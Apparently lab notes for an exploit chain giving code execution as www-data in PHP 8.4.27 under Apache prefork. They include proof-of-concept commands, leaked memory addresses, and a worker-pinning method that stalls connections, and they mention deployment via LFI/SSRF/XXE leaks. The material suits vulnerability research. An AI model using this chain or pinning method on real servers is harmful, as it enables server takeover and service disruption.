# Action D — 115560 under a multi-worker prefork pool

Status: 2026-10-31. Lab-only; fixed benign command `id>/tmp/vd 2>&1`.
Target: `:18206`, container `php2shell-115560-8427-workers`, native arm64
`php:8.4.27-apache-arm64`.

## 1. Setup

New files (main compose, `apache-single.conf`, driver and `webroot/index.php`
untouched):

- `lab-115560/workers.conf` — prefork pool of **8** persistent children
  (`StartServers/MinSpare/MaxSpare/MaxRequestWorkers/ServerLimit = 8`,
  `MaxConnectionsPerChild 0`). `Timeout 120`, `KeepAlive Off`.
- `lab-115560/docker-compose.workers.yml` — service on `:18206`, mounts
  `./webroot`, `php-115560.ini` and `workers.conf`; `SYS_PTRACE` +
  `seccomp=unconfined` for the `/proc` measure only.
- `lab-115560/webroot/worker_id.php` — `pid=getmypid()` oracle for the pinning
  check.
- `lab-115560/fire_pinned.py` — imports the **unmodified** driver's
  `measure`/`fire` and runs them inside `php2shell.pinning.WorkerPinner`.

```sh
cd lab-115560
docker compose -f docker-compose.workers.yml up -d
docker exec php2shell-115560-8427-workers uname -m        # aarch64
docker exec php2shell-115560-8427-workers sh -c \
  'ps -eo pid,ppid,comm | grep apache2 | wc -l'            # 9 = parent + 8
```

> Note: the local `php:8.4.27-apache` tag had been re-pulled as `linux/amd64`
> for action E, so this compose pins the native `php:8.4.27-apache-arm64` tag
> (`platform: linux/arm64`) to keep D on the already-proven native build.

## 2. Unmodified driver on 8 workers (no pinning)

```sh
python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18206 \
  --container php2shell-115560-8427-workers --build 8.4.27 run
```

```
[m] magic hits=6 raw-input=4
[m] pid=20 main=0xffffaf000000 lib=0xffffb10f0000 zif=0xffffb1521510
[m] magic=0xffffaf06c82d carrier=0xffffaf06c02d value_string=0xffffaf06c019 delta=0x6c019
[f] response=<none> proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
[EVIDENCE] 115560 session decode -> var_destroy -> uid=33
```

`/tmp/dtor_log` confirms the two halves ran on **different children**:

```
dtor m=5 inv=2 pid=20   # measure (mode 5, second dtor)
dtor m=4 inv=2 pid=22   # fire    (mode 4, second dtor)
```

So the carrier delta is **fork-inherited**: `main`, `delta` and `lib` measured
in child 20 are valid in child 22. Total wall time 2.3 s.

## 3. Pinning primitive

```sh
python3 poc/verify_worker_pinning.py --target http://127.0.0.1:18206 --holders 7
```

```
[1] Control (no holders): 8 distinct PIDs across 16 responses
    [18, 19, 21, 23, 24, 25, 90, 91]
[2] Pinned (7 stalled holders): 1 distinct PID(s) across 12 responses
    [91]
[EVIDENCE] WORKER PINNING REPRODUCED
```

N-1 stalled POSTs leave exactly one worker, as in the 9bie/devploit primitive.

## 4. Chain inside the pinned window

```sh
python3 lab-115560/fire_pinned.py --target 127.0.0.1:18206 \
  --container php2shell-115560-8427-workers --build 8.4.27 \
  --mode pinned --holders 7
```

```
[pin] pre-measure worker samples: [24]
[m] pid=24 main=0xffffaf000000 lib=0xffffb10f0000 zif=0xffffb1521510
[m] magic=0xffffaf06c82d carrier=0xffffaf06c02d value_string=0xffffaf06c019 delta=0x6c019
[pin] post-measure worker samples: [135]
[pin] lone free worker pid=135
[f] proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
[EVIDENCE] 115560 chain works under worker pinning
```

Unpinned harness control for symmetry:

```
[m] pid=25 ... delta=0x6c019
[pin] post-measure worker samples: [18, 19, 21, 23, 90, 91]
[f] proof='uid=33(www-data) ...'   # fire ran on pid=19
```

## 5. Results

| Scenario | measure pid | fire pid | main | proof |
|---|---|---|---|---|
| 8 workers, unpinned | 20 | 22 | `0xffffaf000000` | ✅ |
| 8 workers, unpinned harness | 25 | 19 | `0xffffaf000000` | ✅ |
| 8 workers, 7 holders | 24 | 135 | `0xffffaf000000` | ✅ |

Geometry is identical in every child: `main=0xffffaf000000`,
`lib=0xffffb10f0000` (`lib-main = 0x20f0000`), `zif_off = 0x431510`,
`delta = 0x6c019`.

## 6. Worker-pairing caveat (the one failure mode found)

**Pinning does not preserve the same PID across measure → fire with this
driver.** `measure()` releases the held child with `kill -9 <pid>`; Apache then
respawns, so the pinned window contains pid 24 for measure and pid 135 for fire
(same single free *slot*, different process). The chain still works because the
ZendMM main chunk was created before the fork and is inherited with the same
base.

Implications:

- For a **leak-fed** seed (external LFI/SSRF/XXE, or GH-22554 in-band leak) no
  worker has to be killed, and pinning then keeps the *same* child for the
  whole chain — the intended deployment primitive.
- For the `/proc` measure this lab uses, pinning only guarantees "one free
  worker per phase". The fork-inherited main makes the PID change harmless.
- If any per-request state is stored in the child (not fork-inherited), the
  measure kill would break it regardless of pinning. The 115560 chain stores
  nothing there; the session file is shared on disk.
- No wrong-worker/address failure was observed: all 8 children share `main`,
  `delta`, `lib` and `zif`.

## 7. Blocker / non-claim

- Tested on **8 workers**, not the stock prefork default of 150. 149 holders
  should work identically (`holders < MaxRequestWorkers`), but was not run.
- `MaxConnectionsPerChild 0` is required for the fork-inherited argument
  (children must not recycle); `apache-single.conf`'s `MaxConnectionsPerChild 1`
  would re-exec the child and can change the mapping.
- No FPM variant was tested (needs `fastcgi_request_buffering off` at the
  frontend).
